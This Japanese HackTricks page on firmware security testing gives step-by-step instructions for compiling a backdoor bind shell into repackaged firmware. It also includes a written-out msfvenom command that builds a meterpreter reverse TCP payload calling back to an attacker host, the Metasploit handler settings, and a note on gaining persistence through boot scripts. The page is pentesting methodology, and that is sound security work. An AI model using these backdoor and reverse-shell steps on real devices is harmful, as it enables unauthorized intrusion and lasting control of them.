<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>


### このページは[https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)からコピーされました

カスタムファームウェアやコンパイル済みバイナリを**アップロードして**、整合性や署名検証の欠陥を探します。例えば、以下の手順でブート時に起動するバックドアバインドシェルをコンパイルします。

1. firmware-mod-kit (FMK)でファームウェアを抽出する
2. 対象ファームウェアのアーキテクチャとエンディアンを特定する
3. Buildrootを使ってクロスコンパイラをビルドするか、環境に合った他の方法を使用する
4. クロスコンパイラを使用してバックドアをビルドする
5. バックドアを抽出したファームウェアの/usr/binにコピーする
6. 適切なQEMUバイナリを抽出したファームウェアのrootfsにコピーする
7. chrootとQEMUを使用してバックドアをエミュレートする
8. netcatを使用してバックドアに接続する
9. 抽出したファームウェアのrootfsからQEMUバイナリを削除する
10. FMKで変更されたファームウェアを再パッケージする
11. ファームウェア分析ツールキット(FAT)でバックドア付きファームウェアをエミュレートし、netcatを使用して対象のバックドアIPとポートに接続してテストする

動的分析、ブートローダーの操作、またはハードウェアセキュリティテストから既にrootシェルを取得している場合は、インプラントやリバースシェルなどの事前にコンパイルされた悪意のあるバイナリを実行してみてください。コマンドアンドコントロール(C&C)フレームワークに使用される自動ペイロード/インプラントツールの使用を検討してください。例えば、Metasploitフレームワークと「msfvenom」は以下の手順を使用して活用できます。

1. 対象ファームウェアのアーキテクチャとエンディアンを特定する
2. `msfvenom`を使用して、適切なターゲットペイロード(-p)、攻撃者ホストIP(LHOST=)、リスニングポート番号(LPORT=)、ファイルタイプ(-f)、アーキテクチャ(--arch)、プラットフォーム(--platform linuxまたはwindows)、出力ファイル(-o)を指定する。例えば、`msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. ペイロードを侵害されたデバイスに転送する（例：ローカルWebサーバーを実行し、ペイロードをファイルシステムにwget/curlする）し、ペイロードが実行権限を持っていることを確認する
4. Metasploitを準備して、着信リクエストを処理する。例えば、msfconsoleでMetasploitを起動し、上記のペイロードに従って以下の設定を使用する：exploit/multi/handlerを使用する、
* `set payload linux/armle/meterpreter_reverse_tcp`
* `set LHOST 192.168.1.245 #攻撃者ホストIP`
* `set LPORT 445 #未使用のポートであれば何でも良い`
* `set ExitOnSession false`
* `exploit -j -z`
5. 侵害されたデバイスでmeterpreterリバースシェルを実行する
6. meterpreterセッションが開くのを見る
7. 侵害後の活動を行う

可能であれば、起動スクリプト内の脆弱性を特定し、再起動をまたいでデバイスへの永続的なアクセスを取得します。このような脆弱性は、起動スクリプトが、SDカードやルートファイルシステム外のデータストレージに使用されるフラッシュボリュームなど、信頼できないマウントされた場所にあるコードを参照、[シンボリックリンク](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data)、または依存している場合に発生します。


<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>
